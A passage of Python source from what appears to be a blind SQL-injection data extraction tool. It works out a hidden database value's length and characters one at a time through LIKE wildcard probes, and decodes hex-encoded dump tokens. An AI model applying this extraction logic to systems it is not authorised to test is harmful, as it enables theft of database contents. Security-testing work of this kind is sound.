                                 warnings=[] if is_null else ["pattern probe failed"])
        if self._likeIs(expr, "", ""):                 # empty string matches only ''
            return ExtractResult("", complete=True, queries=self._queries - q0)
        # length from wildcards: `_`*n + `%` matches iff length >= n. find the
        # largest n that still matches (keep a known-true lower bound; the exponential
        # must NOT advance lo past the true region)
        ge = lambda n: self._likeIs(expr, single * n + multi, "")
        if self.maxlen < 1:                             # capped to nothing: non-empty but unread
            return ExtractResult("", complete=False, truncated=True,
                                 queries=self._queries - q0,
                                 warnings=["maxlen<1: value not read"])
        hi = 1
        while hi < self.maxlen and ge(hi):
            hi = min(hi * 2, self.maxlen)
        lo = 1                                          # ge(1) is true (non-empty)
        while lo < hi:
            mid = (lo + hi + 1) // 2
            lo, hi = (mid, hi) if ge(mid) else (lo, mid - 1)
        length = lo
        # truncated ONLY if a char exists past the cap (ge(maxlen+1)); an exactly-maxlen
        # value is COMPLETE - the old `ge(maxlen)` test flagged every capped value truncated
        truncated = length >= self.maxlen and ge(self.maxlen + 1)
        if limit is not None and limit < length:
            truncated, length = True, limit
        out = []
        for i in range(length):
            hit = None
            for c in _FREQ_ORDER:
                # trailing multi-wildcard when the value continues past `length` (truncated
                # prefix), so the pattern matches the longer source instead of demanding exact len
                pat, esc = self._likePat(i, c, length - i - 1, trailing_multi=truncated)
                if self._likeIs(expr, pat, esc):
                    hit = c
                    break
            out.append(hit if hit is not None else _REPL)
        value = "".join(out)
        warns = ["contains unresolved char"] if _REPL in value else []
        if p.get("case_insensitive"):
            warns.append("LIKE is case-insensitive: letter case may be ambiguous")
        return ExtractResult(value, complete=not truncated and not _hardWarnings(warns),
                             truncated=truncated, queries=self._queries - q0, warnings=warns)

    @staticmethod
    def _decodeHexToken(token, encoding=None):
        if len(token) % 2 or any(c not in _HEXDIGITS + _HEXDIGITS.lower() for c in token):
            return None                          # strict: don't clean corruption
        try:
            raw = _unhexlify(token)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return None
        if encoding:
            # a PROVEN codec is authoritative: if the bytes don't decode under it, that is a
            # FAILURE (return None -> token dropped, result marked incomplete), NOT licence to
            # reinterpret them as some other codec (00 D8 is an invalid UTF-16LE lone surrogate,
            # but a valid UTF-16BE 'O with stroke' - guessing again would silently corrupt).
            try:
                return raw.decode(encoding, "strict")
            except (UnicodeDecodeError, LookupError):
                return None
        # UNKNOWN codec + an embedded NUL is genuinely AMBIGUOUS: bytes `41 00` are valid UTF-8
        # ("A" + NUL) AND valid UTF-16LE ("A"), and no primitive lied - with no proven codec
        # either reading could be right, so neither is exact. Refuse (drop the token -> the caller
        # falls back to per-char extraction, which round-trips each char against the source).
        if b"\x00" in raw:
            return None
        # no NUL and no proven codec: a best-effort DISPLAY decode (exactness of any non-ASCII
        # result is gated separately - the dump downgrades non-ASCII under an unknown codec, and
        # scalar hex recovery refuses to certify unknown-codec non-ASCII bytes).
        for enc in ("utf-8", "latin-1"):
            try:
                return raw.decode(enc)
            except (UnicodeDecodeError, ValueError):
                continue
        return raw.decode("latin-1", "replace")
